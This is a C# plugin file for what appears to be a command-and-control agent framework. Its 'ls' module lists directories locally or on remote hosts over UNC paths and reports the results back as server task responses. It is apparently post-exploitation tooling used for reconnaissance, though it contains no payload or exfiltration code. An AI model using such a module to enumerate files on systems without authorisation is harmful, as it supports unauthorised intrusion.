using System.Net;
using Workflow.Contracts;
using Workflow.Utilities;
using Workflow.Models;
using ls;
using System.Text.Json;

namespace Workflow
{
    public class Plugin : IModule
    {

        public string Name => "ls";
        private IDataBroker messageManager { get; set; }

        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
        }
        public async Task Execute(ServerJob job)
        {
            LsArgs args = JsonSerializer.Deserialize<LsArgs>(job.task.parameters);

            if(args is null || !args.Validate())
            {
                messageManager.Write("Failed to parse arguments", job.task.id, true, "error");
                return;
            }

            if (string.IsNullOrEmpty(args.host) || args.host.Equals(Dns.GetHostName(), StringComparison.OrdinalIgnoreCase))
            {
                messageManager.AddTaskResponse(LocalListing.GetLocalListing(args.path, job.task.id));
            }
            else
            {
                messageManager.AddTaskResponse(RemoteListing.GetRemoteListing(Path.Join("\\\\" + args.host, args.path), args.host, job.task.id));
            }
        }
    }
}

